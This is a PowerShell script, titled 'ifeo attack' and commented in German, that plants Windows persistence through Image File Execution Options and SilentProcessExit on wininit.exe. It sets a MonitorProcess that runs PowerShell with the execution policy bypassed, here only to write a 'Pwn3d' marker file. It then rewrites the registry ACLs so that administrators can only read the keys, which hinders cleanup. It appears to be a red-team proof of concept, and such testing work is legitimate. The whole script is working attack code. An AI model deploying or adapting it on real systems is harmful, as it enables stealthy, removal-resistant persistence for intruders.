Write-Host ""
Write-Host "=== ifeo attack ===" -ForegroundColor Cyan


function Set-RegistryKeyACL {
    param([string]$Path)

    $acl = Get-Acl $Path
    $acl.SetAccessRuleProtection($true, $false)

    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(
        "SYSTEM", "FullControl", "Allow"
    )))
    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(
        "Administrators", "ReadKey", "Allow"
    )))

    Set-Acl -Path $Path -AclObject $acl
}


try {
    Write-Host ""
    Write-Host "- initiate silent process exit" -ForegroundColor Cyan

    # IFEO-Schluessel für wininit.exe erstellen
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe" -Force

    # GlobalFlag setzen (0x200 = 512 als Dezimal)
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe" `
        -Name "GlobalFlag" `
        -Value 512 `
        -PropertyType DWORD `
        -Force


    Write-Host ""
    Write-Host "- set silent process exit" -ForegroundColor Cyan

    # SilentProcessExit-Schluessel erstellen
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe" -Force

    # MonitorProcess setzen
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe" `
        -Name "MonitorProcess" `
        -Value "powershell.exe -ExecutionPolicy Bypass -Command `"Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8`"" `
        -PropertyType String `
        -Force

    # ReportingMode setzen - notwendig, um den MonitorProzess zu starten
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe" `
        -Name "ReportingMode" `
        -Value 1 `
        -PropertyType DWORD `
        -Force

    Write-Host ""
    Write-Host "- set ACL on registry keys" -ForegroundColor Cyan

    # ACL auf beide Registry-Schluessel setzen
    Set-RegistryKeyACL "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe"
    Set-RegistryKeyACL "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe"

} catch {
    Write-Host "IFEO was not successful: $_" -ForegroundColor Yellow
}